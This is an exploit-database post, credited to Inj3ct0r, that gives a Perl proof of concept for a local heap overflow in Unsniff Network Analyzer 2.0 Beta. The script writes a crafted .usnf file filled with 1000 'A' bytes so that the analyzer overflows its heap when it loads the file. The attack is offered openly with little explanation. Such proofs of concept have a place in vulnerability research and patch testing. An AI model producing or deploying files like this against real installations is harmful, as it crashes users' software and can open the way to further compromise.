================================================================
Unsniff Network Analyzer 2.0 Beta (usnf) local Heap Overflow PoC 
================================================================

1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0                          
0     _                   __           __       __                     1
1   /' \            __  /'__`\        /\ \__  /'__`\                   0
0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
1  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\          0
0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
1                  \ \____/ >> Exploit database separated by exploit   0
0                   \/___/          type (local, remote, DoS, etc.)    1
1                                                                      0
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-1

#[+] Discovered By   : Inj3ct0r
#[+] Site            : Inj3ct0r.com
#[+] support e-mail  : submit[at]inj3ct0r.com


#!/usr/bin/perl
#Unsniff Network Analyzer 2.0 Beta (usnf) local Heap Overflow PoC
#Download : http://www.unleashnetworks.com/downloads.html
#Exploiter : opt!x hacker
#Gzeetz to : LiquidWorm , shinnai , his0k4 and stack

my $exploit = "\x41" x 1000;
open(myfile,'>>AIDI.usnf');
print myfile $exploit;

